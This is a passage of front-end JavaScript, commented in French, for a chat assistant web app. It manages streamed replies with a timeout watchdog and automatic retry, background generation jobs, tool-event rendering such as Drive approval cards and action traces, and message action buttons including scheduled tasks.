//  - en dernier recours : bloc d'erreur clair (plus jamais de
//    "Analyse de votre demande…" affiché indéfiniment) ;
//  - en cours de réponse : un silence anormalement long coupe proprement le
//    flux en conservant le texte déjà reçu.
const STREAM_WATCHDOG_TICK_MS  = 5000;   // fréquence du check
const STREAM_SLOW_NOTICE_MS    = 15000;  // avant 1er token : informer que c'est long
const STREAM_NO_TOKEN_ABORT_MS = 90000;  // avant 1er token : abandonner / retenter
const STREAM_STALL_ABORT_MS    = 150000; // en cours de réponse : silence anormal
const STREAM_MAX_AUTO_RETRIES  = 1;      // nouvelles tentatives automatiques

/**
 * Valide une réponse HTTP censée ouvrir un flux SSE. Renvoie true si le flux
 * peut être lu ; sinon affiche l'erreur appropriée (quota, erreur serveur,
 * corps non-SSE type 400) dans la bulle assistant et renvoie false.
 * Sans cette garde, un statut d'erreur laissait le placeholder affiché à vie.
 */
async function guardStreamResponse(response, assistantEl) {
    const ctype = response.headers.get('Content-Type') || '';
    if (response.ok && ctype.includes('text/event-stream')) return true;

    const data = ctype.includes('application/json')
        ? await response.json().catch(() => ({}))
        : {};

    if (response.status === 429 && handleQuotaExceededPayload(data)) {
        assistantEl?.closest('.message')?.remove();
        return false;
    }

    let kind, title, fallback;
    if (!response.ok) {
        kind = response.status >= 500 ? 'server' : 'bad_request';
        title = response.status >= 500 ? t('Erreur du serveur') : t('Demande refusée par le serveur');
        fallback = t('Le serveur a répondu avec une erreur (HTTP {code}). Réessayez ou reformulez votre demande.', { code: response.status });
    } else {
        kind = 'server';
        title = t('Réponse inattendue du serveur');
        fallback = t('Le serveur n\'a pas ouvert le flux de réponse attendu. Réessayez dans un instant.');
    }
    renderInlineError(assistantEl, { kind, title, message: data.error || fallback });
    return false;
}

/** Met à jour (ou recrée) le texte de phase en italique de la bulle en cours. */
function setStreamPhaseText(contentEl, text) {
    if (!contentEl) return;
    let label = contentEl.querySelector('.stream-phase-label');
    if (!label) {
        const phaseEl = buildStreamPhaseEl('analyzing');
        contentEl.insertBefore(phaseEl, contentEl.firstChild);
        label = phaseEl.querySelector('.stream-phase-label');
    }
    label.textContent = text;
}

/**
 * Démarre le check périodique sur un flux. `state` doit exposer
 * { done, el, controller, lastEventAt, retryAttempt? } ; l'issue est posée
 * dans `state.watchdogAction` ('retry' | 'timeout' | 'stall') avant l'abort.
 */
function startStreamWatchdog(state, { canAutoRetry, getRawLength, isVisible }) {
    state.lastEventAt = Date.now();
    const timer = setInterval(() => {
        if (state.done) { clearInterval(timer); return; }
        const idleMs = Date.now() - state.lastEventAt;

        if (getRawLength() === 0) {
            if (idleMs >= STREAM_NO_TOKEN_ABORT_MS) {
                clearInterval(timer);
                state.watchdogAction = canAutoRetry() ? 'retry' : 'timeout';
                try { state.controller?.abort(); } catch (_) {}
            } else if (idleMs >= STREAM_SLOW_NOTICE_MS && isVisible() && state.el) {
                const secs = Math.round(idleMs / 1000);
                const prefix = (state.retryAttempt || 0) > 0
                    ? t('Nouvelle tentative — le modèle tarde encore à répondre…')
                    : t('Le modèle met plus de temps que prévu à répondre…');
                const note = canAutoRetry()
                    ? t('Une nouvelle tentative partira automatiquement si besoin.')
                    : t('En cas de silence prolongé, la demande sera interrompue.');
                setStreamPhaseText(state.el, t('{phase} ({secs} s) {note}', { phase: prefix, secs: secs, note: note }));
            }
        } else if (idleMs >= STREAM_STALL_ABORT_MS) {
            // Des tokens ont déjà été reçus mais plus rien depuis longtemps :
            // on coupe proprement en conservant le texte partiel.
            clearInterval(timer);
            state.watchdogAction = 'stall';
            try { state.controller?.abort(); } catch (_) {}
        }
    }, STREAM_WATCHDOG_TICK_MS);
    return timer;
}

/**
 * Applique l'issue décidée par le watchdog (ou par une fin de flux prématurée)
 * sur la bulle assistant. Le cas 'retry' est géré par l'appelant (relance).
 */
function applyWatchdogOutcome(state, cidStr) {
    if (!state.watchdogAction || state.watchdogAction === 'retry') return;
    const visible = state.el && cidStr === String(visibleConvId);

    if (state.watchdogAction === 'stall') {
        const marker = t("\n\n*[Réponse interrompue : le serveur a cessé de répondre.]*");
        if (!(state.rawText || '').endsWith(marker)) {
            state.rawText = (state.rawText || '').trimEnd() + marker;
        }
        if (visible) {
            state.el.querySelector('.stream-phase')?.remove();
            state.el.dataset.raw = state.rawText;
            finalizeAssistantMessage(state.el);
        } else {
            showToast(t('Une réponse en arrière-plan a été interrompue : le serveur a cessé de répondre.'), 'warning');
        }
        return;
    }

    // 'timeout' : aucune réponse malgré la (les) tentative(s).
    if (visible) {
        renderInlineError(state.el, {
            kind: 'server',
            title: t('Le modèle ne répond pas'),
            message: t('Aucune réponse du modèle malgré une nouvelle tentative automatique. ')
                + t('Le fournisseur rencontre probablement un incident — cliquez sur « Regénérer » pour réessayer dans quelques instants.'),
        });
    } else {
        showToast(t('Une conversation en arrière-plan n\'a reçu aucune réponse du modèle.'), 'error');
    }
}

/**
 * Relance automatiquement la génération après un timeout sans le moindre
 * token. Passe par /regenerate : le message utilisateur est déjà persisté
 * par /send, et le serveur ne supprime que les réponses assistant
 * postérieures au dernier message utilisateur (aucun risque de perdre la
 * réponse d'un tour précédent).
 */
async function autoRetryGeneration(cidStr, assistantEl, attempt) {
    const el = assistantEl;
    if (el && cidStr === String(visibleConvId)) {
        el.classList.add('streaming');
        el.__streamRenderFinalized = false;
        delete el.dataset.errorPayload;
        delete el.dataset.errorBlock;
        el.dataset.raw = '';
        const md = el.querySelector('.md-render');
        if (md) md.innerHTML = '';
        el.querySelector('.stream-phase')?.remove();
        el.insertBefore(buildStreamPhaseEl('analyzing'), el.firstChild);
        setStreamPhaseText(el, t('Le modèle n\'a pas répondu — nouvelle tentative automatique…'));
        showToast(t('Le modèle n\'a pas répondu. Nouvelle tentative automatique…'), 'warning');
    }

    const controller = new AbortController();
    let response;
    try {
        // Pas de champ `llm` : le serveur réutilise le LLM de la conversation.
        const retryFd = new FormData();
        retryFd.append('tz', clientTimeZone());
        response = await fetchWithSessionGuard(`/chat/${cidStr}/regenerate`, {
            method: 'POST',
            headers: { 'X-CSRF-Token': csrfToken },
            body: retryFd,
            signal: controller.signal,
        });
    } catch (err) {
        if (err instanceof Error && err.message === 'SESSION_EXPIRED') return;
        renderInlineError(el, {
            kind: 'network',
            title: t('Connexion impossible'),
            message: t('La nouvelle tentative a échoué : impossible de contacter le serveur. ')
                + t('Vérifiez votre connexion puis cliquez sur « Regénérer ».'),
        });
        return;
    }
    if (!(await guardStreamResponse(response, el))) return;
    runStreamLoop(cidStr, response.body.getReader(), el, controller, attempt);
}

// =========================================================
// GESTION DES STREAMS EN ARRIÈRE-PLAN
// =========================================================

/**
 * Applique UN évènement de génération de chat à l'état d'un flux.
 *
 * Extrait de runStreamLoop pour être partagé avec les générations
 * asynchrones : le transport diffère (lecture d'un flux HTTP ouvert vs
 * EventSource rattachable), le rendu doit rester STRICTEMENT le même.
 */
function applyChatStreamEvent(state, cidStr, json) {
    // Quota basculé pendant l'attente en file : la génération n'a pas démarré.
    if (json.quota_exceeded) {
        state.done = true;
        state.hadError = true;
        if (cidStr === String(visibleConvId)) {
            state.el?.closest('.message')?.remove();
        }
        handleQuotaExceededPayload(json);
        notifyChatTurnEnded(cidStr, { status: 'quota', jobId: state.jobId || null, msgId: null, hadError: true });
        return;
    }

    if (json.hint && cidStr === String(visibleConvId)) {
        showFilesHint(json.hint);
    }

    if (json.phase) {
        state.currentPhase = json.phase;
        if (state.el && cidStr === String(visibleConvId)) {
            updateStreamPhase(state.el, json.phase);
        }
    }

    if (json.chunk) {
        state.rawText += json.chunk;
        if (state.el && cidStr === String(visibleConvId)) {
            // Premier chunk : on retire le bandeau de phase pour laisser la place au texte
            state.el.querySelector('.stream-phase')?.remove();
            state.el.dataset.raw = state.rawText;
            scheduleStreamingMarkdownRender(state.el);
        }
        // La conversation vocale lit la réponse PENDANT qu'elle s'écrit : un
        // nouveau fragment peut compléter la phrase qu'elle attend.
        document.dispatchEvent(new CustomEvent('mia:chat-progress', { detail: { convId: cidStr, jobId: state.jobId || null } }));
    }

    // Bascule sur LLM de secours : le primaire est tombé avant le
    // 1er token. On informe l'utilisateur via toast — le badge final
    // sera posé par l'événement `done` (cohérent avec la facturation).
    if (json.llm_fallback) {
        if (cidStr === String(visibleConvId)) {
            announceLlmFallback(json.llm_fallback);
        }
    }

    // Erreur API capturée par le serveur : on remplace la bulle en
    // cours par un bloc d'erreur propre (jamais de chunk brut).
    if (json.llm_error) {
        state.hadError = true;
        state.errorPayload = json.llm_error;
        if (state.el && cidStr === String(visibleConvId)) {
            renderInlineError(state.el, json.llm_error);
            sendBtn.disabled = msgInput.value.trim() === '' && pendingFiles.length === 0;
        }
    }

    // Image générée par l'assistant via function-calling : on l'insère
    // en markdown dans la bulle en cours (même ordre que la persistance
    // serveur, qui ajoute le même markdown au message assistant).
    if (json.tool_image && json.tool_image.url) {
        state.rawText += '\n\n![' + t('Image générée') + '](' + json.tool_image.url + ')\n\n';
        if (state.el && cidStr === String(visibleConvId)) {
            state.el.querySelector('.stream-phase')?.remove();
            state.el.dataset.raw = state.rawText;
            scheduleStreamingMarkdownRender(state.el);
        }
    }

    // Écriture Google Drive demandée par l'assistant : carte
    // d'approbation insérée sous la bulle (hors .msg-content, qui
    // est re-rendu à chaque delta markdown et l'écraserait).
    if (json.drive_confirm && json.drive_confirm.id) {
        if (state.el && cidStr === String(visibleConvId)) {
            state.el.querySelector('.stream-phase')?.remove();
            const body = state.el.closest('.msg-body') || state.el.parentElement;
            renderDriveConfirmCard(body, json.drive_confirm);
            syncDriveBatchBar();
        }
    }

    // Proposition révisée : la carte d'avant est close côté serveur.
    if (json.drive_superseded && Array.isArray(json.drive_superseded.ids)) {
        json.drive_superseded.ids.forEach(markDriveCardSuperseded);
        syncDriveBatchBar();
    }

    // Tâche programmée « sans validation » : relevé des actions effectuées,
    // tenu à jour pendant le tour et posé AVANT la réponse en cours — en
    // base, il est créé avant elle (cf. upsertAutoRecord).
    if (json.auto_record && json.auto_record.id) {
        state.autoRecord = json.auto_record;
        if (state.el && cidStr === String(visibleConvId)) {
            upsertAutoRecord(state.el, json.auto_record);
        }
    }

    // Mémoire long terme mise à jour depuis le chat.
    if (json.memory_saved) {
        if (state.el && cidStr === String(visibleConvId)) {
            const body = state.el.closest('.msg-body') || state.el.parentElement;
            renderMemoryChip(body, json.memory_saved);
        }
    }

    // Action effectuée par l'assistant (recherche KB/Internet, lecture d'un
    // connecteur…) : empilée dans l'état du flux (survit à un changement de
    // conversation) et rendue en tête de la bulle si elle est visible. Émise
    // aussi en évènement DOM : la conversation vocale l'annonce à voix haute.
    // Appel d'outil qui COMMENCE : ligne « en cours » (animée) en bas de la
    // pile, remplacée par la ligne terminée à l'arrivée de `action`.
    if (json.action_start) {
        state.running = state.running || [];
        state.running.push(json.action_start);
        if (state.el && cidStr === String(visibleConvId)) {
            const body = state.el.closest('.msg-body') || state.el.parentElement;
            renderActionTrace(body, state.actions || [], state.running);
        }
    }

    if (json.action) {
        state.actions = state.actions || [];
        state.actions.push(json.action);
        if (Array.isArray(state.running)) {
            const k = state.running.findIndex(r => r && r.t === json.action.t);
            if (k >= 0) state.running.splice(k, 1);
        }
        if (state.el && cidStr === String(visibleConvId)) {
            const body = state.el.closest('.msg-body') || state.el.parentElement;
            renderActionTrace(body, state.actions, state.running || []);
        }
        document.dispatchEvent(new CustomEvent('mia:chat-action', { detail: { convId: cidStr, jobId: state.jobId || null, action: json.action } }));
    }

    // Note d'avancement du modèle entre deux outils (Claude récents) : une
    // ligne vivante sous la pile, remplacée à chaque note, retirée à la fin.
    if (typeof json.progress === 'string' && json.progress !== '') {
        state.progress = json.progress;
        if (state.el && cidStr === String(visibleConvId)) {
            renderProgressNote(state.el.closest('.msg-body') || state.el.parentElement, state.progress);
        }
    }

    // Plan de travail affiché (outil plan_de_travail) : carte en tête de la
    // réponse, mise à jour à chaque appel.
    if (json.plan && Array.isArray(json.plan.etapes)) {
        state.plan = json.plan;
        if (state.el && cidStr === String(visibleConvId)) {
            renderPlanCard(state.el.closest('.msg-body') || state.el.parentElement, state.plan);
        }
    }

    if (json.done) {
        if (jobNeedsNotification(cidStr)) {
            notifyJobDone(t('MIA a terminé sa réponse.'), cidStr);
        }
        state.finalQuotaStatus = json.quota_status || null;
        state.finalConversationCredits = Number(json.conversation_credits_total ?? 0);
        if (json.msg_id && state.el) {
            state.el.dataset.messageId = String(json.msg_id);
            state.el.closest('.message')?.setAttribute('data-message-id', String(json.msg_id));
        }
        // Trace complète re-servie par le serveur : couvre l'attache tardive
        // (events purgés → seul le payload final est rejoué). Plus aucune
        // ligne « en cours » ni note d'avancement : le tour est fini.
        state.running = [];
        state.progress = '';
        if (state.el && cidStr === String(visibleConvId)) {
            const body = state.el.closest('.msg-body') || state.el.parentElement;
            renderActionTrace(body, Array.isArray(json.actions) && json.actions.length ? json.actions : (state.actions || []), []);
            renderProgressNote(body, '');
            if (json.plan && Array.isArray(json.plan.etapes)) renderPlanCard(body, json.plan);
            if (json.suite) body.closest('.message')?.setAttribute('data-suite', String(json.suite));
            // Attache tardive : le relevé re-servi par le payload final.
            if (json.auto_record && json.auto_record.id) upsertAutoRecord(state.el, json.auto_record);
        }
        if (Array.isArray(json.actions) && json.actions.length) {
            state.actions = json.actions;
        }
        if (json.plan) state.plan = json.plan;
        state.suite = json.suite || null;
        state.done = true;
        state.finalLlmBadge = json.llm_badge || null;
        state.finalCredits  = Number(json.credits ?? 0);
        state.finalResponseMs = Number(json.response_ms ?? 0);
        // Mise à jour du titre de conversation si le serveur en a
        // généré un (LLM résumé, 1er échange uniquement).
        if (typeof json.conversation_title === 'string' && json.conversation_title.trim() !== '') {
            applyConversationTitle(cidStr, json.conversation_title.trim());
        }
        if (state.el && cidStr === String(visibleConvId)) {
            applyQuotaStatus(json.quota_status || null);
            applyConversationCreditsTotal(json.conversation_credits_total ?? 0);
            if (state.hadError && state.errorPayload) {
                // Réponse en erreur : bloc d'erreur propre, pas de badge LLM.
                renderInlineError(state.el, state.errorPayload);
            } else {
                finalizeAssistantMessage(state.el);
                applyLlmBadge(state.el.closest('.message'), state.finalLlmBadge, state.finalCredits, state.finalResponseMs);
            }
            sendBtn.disabled = msgInput.value.trim() === '' && pendingFiles.length === 0;
        }
        notifyChatTurnEnded(cidStr, { status: 'done', jobId: state.jobId || null, msgId: json.msg_id || null, hadError: !!state.hadError, errorTitle: turnErrorTitle(state) });
        if (cidStr === String(visibleConvId)) syncContinueButton();
    }
}
/**
 * Rattache l'affichage à une génération de chat qui tourne CÔTÉ SERVEUR.
 *
 * L'état est enregistré dans `activeStreams` comme un flux classique : le
 * rebranchement au changement de conversation, l'indicateur de la sidebar et la
 * bascule Envoyer/Stop fonctionnent sans code en double. Seul le transport
 * change (EventSource rattachable au lieu d'un flux HTTP tenu par l'onglet).
 *
 * Pas de watchdog ici : le serveur garantit un `job_end` (synthétisé depuis le
 * statut, et le reaper échoue un job orphelin en moins de deux minutes). Le
 * relancer côté client dupliquerait la génération.
 */
function attachChatJob(jobId, cid, assistantEl) {
    const cidStr = String(cid);
    const state = {
        rawText: '', done: false, finalQuotaStatus: null, finalConversationCredits: null,
        el: assistantEl, currentPhase: 'analyzing', controller: null, aborted: false,
        jobId: String(jobId), es: null, errors: 0,
    };
    activeStreams.set(cidStr, state);
    updateStreamingIndicator(cidStr, true);
    if (cidStr === String(visibleConvId)) refreshSendStopUi();
    signalJobsChanged();

    const es = new EventSource(`/jobs/${jobId}/stream`);
    state.es = es;
    es.onmessage = (ev) => {
        state.errors = 0;
        let json;
        try { json = JSON.parse(ev.data); } catch (_p) { return; }
        if (json.job_end) { finishChatJobStream(state, cidStr, String(json.status || 'done')); return; }
        applyChatStreamEvent(state, cidStr, json);
    };
    es.onerror = () => {
        if (state.done) { finishChatJobStream(state, cidStr, 'done'); return; }
        // EventSource se reconnecte seul ; on n'abandonne qu'après plusieurs
        // échecs d'affilée (session expirée, route injoignable).
        state.errors += 1;
        if (state.errors >= 6) finishChatJobStream(state, cidStr, 'lost');
    };
    return state;
}

/** Clôture l'affichage d'une génération de chat asynchrone. */
function finishChatJobStream(state, cidStr, status) {
    try { state.es?.close(); } catch (_e) {}
    updateStreamingIndicator(cidStr, false);
    if (activeStreams.get(cidStr) === state) activeStreams.delete(cidStr);
    signalJobsChanged();

    const visible = cidStr === String(visibleConvId);
    // Tour clos sans payload `done` (interrompu, perdu, en erreur) : la
    // conversation vocale doit le savoir pour ne pas attendre une réponse.
    if (!state.done) {
        notifyChatTurnEnded(cidStr, { status: state.aborted ? 'cancelled' : String(status || 'lost'), jobId: state.jobId || null, msgId: null, hadError: !!state.hadError, errorTitle: turnErrorTitle(state) });
    }
    // Flux clos sans `done` ni erreur : réponse tronquée côté serveur, ou
    // suivi perdu. On ne laisse JAMAIS le placeholder tourner indéfiniment.
    if (!state.done && !state.hadError && visible && state.el) {
        if (status === 'cancelled' || state.aborted) {
            state.el.querySelector('.stream-phase')?.remove();
            const marker = "\n\n" + t("*[Réponse interrompue par l'utilisateur]*");
            if (!state.rawText.endsWith(marker)) {
                state.rawText = (state.rawText || '').trimEnd() + marker;
            }
            state.el.dataset.raw = state.rawText;
            finalizeAssistantMessage(state.el);
        } else if (state.rawText.trim() !== '') {
            state.el.querySelector('.stream-phase')?.remove();
            state.el.dataset.raw = state.rawText;
            finalizeAssistantMessage(state.el);
        } else {
            renderInlineError(state.el, status === 'lost' ? {
                kind: 'network',
                title: t('Suivi interrompu'),
                message: t('Le suivi de la réponse a été perdu. Rechargez la page — la génération continue côté serveur.'),
            } : {
                kind: 'server',
                title: t('Génération interrompue'),
                message: t('La génération a été interrompue côté serveur. Réessayez.'),
            });
        }
    }
    state.done = true;
    if (visible) {
        sendBtn.disabled = msgInput.value.trim() === '' && pendingFiles.length === 0;
        refreshSendStopUi();
        // Réponse interrompue ou perdue : ses choix ne seront jamais complétés.
        syncChoicePrompts();
    }
}

/**
 * Lance la boucle de lecture SSE pour une conversation.
 * S'exécute indépendamment — l'utilisateur peut naviguer pendant ce temps.
 */
async function runStreamLoop(cid, reader, initialAssistantEl, controller = null, retryAttempt = 0) {
    const cidStr = String(cid);
    const state = { rawText: '', done: false, finalQuotaStatus: null, finalConversationCredits: null, el: initialAssistantEl, currentPhase: 'analyzing', controller, aborted: false, retryAttempt, watchdogAction: null };
    activeStreams.set(cidStr, state);
    updateStreamingIndicator(cidStr, true);
    if (cidStr === String(visibleConvId)) refreshSendStopUi();

    // Check régulier : si le serveur reste silencieux, informe l'utilisateur,
    // retente automatiquement, ou coupe avec une erreur claire.
    state.watchdogTimer = startStreamWatchdog(state, {
        canAutoRetry: () => retryAttempt < STREAM_MAX_AUTO_RETRIES,
        getRawLength: () => state.rawText.length,
        isVisible: () => cidStr === String(visibleConvId),
    });

    const decoder = new TextDecoder();
    let buffer = '';
    try {
        while (true) {
            const { done, value } = await reader.read();
            if (done) break;
            state.lastEventAt = Date.now();

            buffer += decoder.decode(value, { stream: true });
            const lines = buffer.split('\n');
            buffer = lines.pop();

            for (const line of lines) {
                if (!line.startsWith('data: ')) {
                    // Ligne non-SSE : si ça ressemble à un redirect login → session expirée mid-flux.
                    if (looksLikeAuthFailure(line)) {
                        try { reader.cancel(); } catch (_) {}
                        showSessionExpiredModal();
                        return;
                    }
                    continue;
                }
                let json;
                try {
                    json = JSON.parse(line.slice(6));
                } catch (_parseErr) {
                    // Parse raté : c'est soit du HTML redirect (session expirée),
                    // soit un événement malformé qu'on ignore.
                    if (looksLikeAuthFailure(line)) {
                        try { reader.cancel(); } catch (_) {}
                        showSessionExpiredModal();
                        return;
                    }
                    continue;
                }

                if (json.error === 'session_expired' || json.authenticated === false) {
                    try { reader.cancel(); } catch (_) {}
                    showSessionExpiredModal(json.login_url || LOGIN_PATH);
                    return;
                }

                applyChatStreamEvent(state, cidStr, json);
            }
        }

        // Flux terminé par le serveur SANS événement final `done` ni erreur :
        // réponse tronquée (crash PHP, coupure proxy…). On ne laisse JAMAIS
        // le placeholder affiché indéfiniment : partiel conservé, sinon
        // nouvelle tentative automatique, sinon erreur claire.
        if (!state.done && !state.hadError && !state.aborted) {
            if (!state.watchdogAction) {
                if (state.rawText.trim() !== '') {
                    state.watchdogAction = 'stall';
                } else {
                    state.watchdogAction = retryAttempt < STREAM_MAX_AUTO_RETRIES ? 'retry' : 'timeout';
                }
            }
            applyWatchdogOutcome(state, cidStr);
        }
    } catch (err) {
        state.done = true;
        // Issue décidée par le watchdog (silence serveur) : rendu dédié,
        // le cas 'retry' est relancé dans le finally.
        if (state.watchdogAction) {
            applyWatchdogOutcome(state, cidStr);
        // Abort déclenché par l'utilisateur (bouton Stop) : on conserve le texte
        // déjà streamé et on lui ajoute un marqueur visuel cohérent avec la
        // sauvegarde serveur.
        } else if (state.aborted || (err && (err.name === 'AbortError' || err.message === 'BodyStreamBuffer was aborted'))) {
            if (state.el && cidStr === String(visibleConvId)) {
                state.el.querySelector('.stream-phase')?.remove();
                const marker = "\n\n" + t("*[Réponse interrompue par l'utilisateur]*");
                if (!state.rawText.endsWith(marker)) {
                    state.rawText = (state.rawText || '').trimEnd() + marker;
                }
                state.el.dataset.raw = state.rawText;
                finalizeAssistantMessage(state.el);
            }
        } else if (state.el && cidStr === String(visibleConvId)) {
            renderInlineError(state.el, {
                kind: 'network',
                title: t('Connexion interrompue'),
                message: t('La connexion au serveur a été perdue pendant la génération. Réessayez.'),
            });
            sendBtn.disabled = msgInput.value.trim() === '' && pendingFiles.length === 0;
        } else {
            showToast(t('La génération d\'une conversation en arrière-plan a échoué.'), 'error');
        }
    } finally {
        state.done = true;
        if (state.watchdogTimer) clearInterval(state.watchdogTimer);
        updateStreamingIndicator(cidStr, false);
        activeStreams.delete(cidStr);
        if (cidStr === String(visibleConvId)) {
            sendBtn.disabled = msgInput.value.trim() === '' && pendingFiles.length === 0;
            refreshSendStopUi();
            syncChoicePrompts();
        }
        // Relance automatique (aucun token reçu) : après le nettoyage, pour
        // que le nouveau flux se réenregistre proprement dans activeStreams.
        if (state.watchdogAction === 'retry') {
            autoRetryGeneration(cidStr, state.el, retryAttempt + 1);
        }
    }
}

/** Met à jour l'indicateur pulsant sur l'item sidebar de la conv. */
function updateStreamingIndicator(cidStr, active) {
    const item = document.querySelector(`.conv-item[data-id="${cidStr}"]`);
    if (item) item.classList.toggle('conv-streaming', active);
}

/** Détecte un message qui ne contient qu'une image markdown (outil "Imagine"). */
const IMAGE_ONLY_MD_RE = /^\s*!\[[^\]]*\]\(([^)]+)\)\s*$/u;

function isImageOnlyText(rawText) {
    return typeof rawText === 'string' && IMAGE_ONLY_MD_RE.test(rawText);
}

function extractImageUrlFromText(rawText) {
    if (typeof rawText !== 'string') return null;
    const m = rawText.match(IMAGE_ONLY_MD_RE);
    return m ? m[1].trim() : null;
}

function buildAssistantActionsHtml(rawText = '') {
    const imageOnly = isImageOnlyText(rawText);
    const copyTitle = imageOnly ? t('Copier l\'image dans le presse-papier') : t('Copier la réponse');
    const trailingBtn = imageOnly
        ? `<button class="msg-action-btn btn-save-image" title="Télécharger l'image sur l'ordinateur">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Télécharger l'image
            </button>`
        : `<button class="msg-action-btn btn-export-pdf" title="Exporter la réponse en PDF">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><path d="M8 13h8"/><path d="M8 17h5"/></svg>Exporter en PDF
            </button>
            <button class="msg-action-btn btn-export-docx" title="Exporter la réponse en Word (.docx)">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><path d="M8 13l1 4 1.5-3 1.5 3 1-4"/></svg>Exporter en Word
            </button>`;
    // « Refaire régulièrement » : la demande devient une tâche programmée.
    // Même rendu que templates/partials/message.php — à garder synchronisés.
    const scheduleBtn = (window.SCHEDULES_ENABLED && !imageOnly && rawText && !looksLikeErrorMessage(rawText))
        ? `<button type="button" class="msg-action-btn btn-schedule" title="${escAttr(t('Programmer cette demande pour qu’elle se répète'))}">
                ${scheduleIconSvg(14)}${escHtml(t('Refaire régulièrement'))}
            </button>`
        : '';
    return `
        <button class="msg-action-btn btn-copy" title="${copyTitle}">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>Copier
        </button>
        <button class="msg-action-btn btn-regen" title="Regénérer la réponse">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-4.5"/></svg>Regénérer
        </button>
        ${trailingBtn}
        ${scheduleBtn}`;
}

/**
 * Horloge des tâches programmées : le tracé vient du serveur
 * (ScheduledTask::ICON_PATHS, window.SCHEDULE_ICON) — une seule icône pour la
 * routine, partout.
 */
function scheduleIconSvg(size, cls = '') {
    return `<svg${cls ? ` class="${cls}"` : ''} width="${size}" height="${size}" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">${window.SCHEDULE_ICON || ''}</svg>`;
}

/**
 * Sources cochées dans le menu « + » (Recherche Internet, connecteurs) :
 * reprises par le formulaire d'une tâche programmée créée depuis une réponse.
 * Clés = celles de ConnectorRegistry, comme Scheduler::ACCESS_FLAGS.
 */
const SCHEDULE_SOURCE_TOGGLES = {
    web: 'webAccessToggle', drive: 'driveAccessToggle', gmail: 'gmailAccessToggle',
    calendar: 'calendarAccessToggle', tasks: 'tasksAccessToggle', outlook: 'outlookAccessToggle',
    mscalendar: 'mscalendarAccessToggle', mstodo: 'mstodoAccessToggle', teams: 'teamsAccessToggle',
    slack: 'slackAccessToggle',
};

function checkedScheduleSources() {
    return Object.entries(SCHEDULE_SOURCE_TOGGLES)
        .filter(([, id]) => document.getElementById(id)?.checked)
        .map(([key]) => key);
}

function scheduleUrlForMessage(messageId) {
    const params = new URLSearchParams({ from: String(messageId) });
    params.set('src', checkedScheduleSources().join(','));
    return '/settings/schedules/new?' + params.toString();
}

/**
 * Horloge de l'assistant (rangée d'identité de la zone de saisie) : le
 * formulaire d'une tâche avec CET assistant, les sources cochées et — s'il y
 * en a — le texte en cours de saisie. Le texte ne passe jamais par l'adresse
 * (journaux, historique) : il attend dans le stockage de session de l'onglet,
 * que schedules.js reprend une fois.
 */
const SCHEDULE_DRAFT_KEY = 'mia.scheduleDraft';
function openScheduleFromComposer(profileId) {
    const text = (msgInput?.value || '').trim();
    try {
        if (text) sessionStorage.setItem(SCHEDULE_DRAFT_KEY, JSON.stringify({ text, at: Date.now() }));
        else sessionStorage.removeItem(SCHEDULE_DRAFT_KEY);
    } catch (_e) {
        // Stockage indisponible (navigation privée) : le formulaire s'ouvre sans le texte.
    }
    const params = new URLSearchParams({ compose: '1' });
    if (profileId) params.set('profile', String(profileId));
    params.set('src', checkedScheduleSources().join(','));
    // Bases cochées dans le sélecteur du composer (hors celles de
    // l'assistant, verrouillées) : la tâche les reprend — validées par le serveur.
    const kbIds = Array.from(document.querySelectorAll('#kbPickerList .kb-picker-row[data-locked="0"]'))
        .filter((row) => row.querySelector('input[type="checkbox"]')?.checked)
        .map((row) => row.dataset.kbId)
        .filter(Boolean);
    if (kbIds.length) params.set('kb', kbIds.join(','));
    window.location.href = '/settings/schedules/new?' + params.toString();
}
document.getElementById('assistantScheduleBtn')?.addEventListener('click', (e) => {
    e.preventDefault();
    const btn = e.currentTarget;
    openScheduleFromComposer(btn.dataset.profileId || document.getElementById('profileSelect')?.value || '');
});

/** Bandeau en tête d'une conversation née d'une tâche — même balisage que templates/chat/index.php. */
function buildScheduledBannerHtml(banner) {
    if (!banner || !banner.name) return '';
    const sentence = banner.sentence ? `<span class="sched-banner-sentence">${escHtml(banner.sentence)}</span>` : '';
    const paused = banner.active ? '' : `<span class="sched-banner-paused">${escHtml(t('En pause'))}</span>`;
    return `<div class="sched-banner" id="scheduledBanner">
            ${scheduleIconSvg(16, 'sched-banner-icon')}
            <span class="sched-banner-text">
                <span class="sched-banner-kicker">${escHtml(t('Tâche programmée'))}</span>
                <strong>${escHtml(banner.name)}</strong>
                ${sentence}${paused}
            </span>
            <a class="sched-banner-link" href="${escAttr(banner.url || '/settings/schedules')}">${escHtml(t('Gérer la tâche'))}</a>
        </div>`;
}

// Bouton « Copier » d'un message utilisateur (révélé au clic sur le texte).
function buildUserActionsHtml() {
    return `
        <button class="msg-action-btn btn-copy-user" title="Copier le message">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>Copier
        </button>`;
}

/** Refresh `.msg-actions` after streaming completes (text → maybe Save instead of PDF). */
function refreshAssistantActions(messageEl) {
    if (!messageEl) return;
    const actions = messageEl.querySelector('.msg-actions');
    const content = messageEl.querySelector('.msg-content');
    if (!actions || !content) return;
